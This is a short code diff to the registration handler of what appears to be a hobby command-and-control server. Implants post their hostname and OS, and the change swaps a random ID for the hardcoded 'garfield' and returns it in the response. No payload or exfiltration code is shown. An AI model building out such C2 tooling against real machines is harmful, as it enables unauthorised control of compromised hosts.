@@ -41,7 +41,7 @@ def register_implant(listener):
         # This reads each part of the form
         fields = cgi.parse_multipart(listener.rfile, pdict)
         # Grab the "task" field that was input by the post request.
-        uuid = uuid4()
+        uuid = "garfield"
         tgt_ip = listener.client_address
         tgt_hostname = fields.get('hostname')
         tgt_os = fields.get('os type')
@@ -55,10 +55,10 @@ def register_implant(listener):
         # Come back to this later to add to dict ******************************************
         # tasklist.append(new_task[0])
 
-    # 301 is a redirect status response. This case, we want the user
-    # to be redirected to the tasklist/new page after submitting a task.
-    listener.send_response(201)
-    # listener.send_header('content-type', 'text/html')
-    # listener.send_header('Location', '/new')
-    # Always have to close the header.
-    listener.end_headers()
+        # 301 is a redirect status response. This case, we want the user
+        # to be redirected to the tasklist/new page after submitting a task.
+        listener.send_response(201, f"@{uuid}")
+        # listener.send_header('content-type', 'text/html')
+        # listener.send_header('Location', '/new')
+        # Always have to close the header.
+        listener.end_headers()
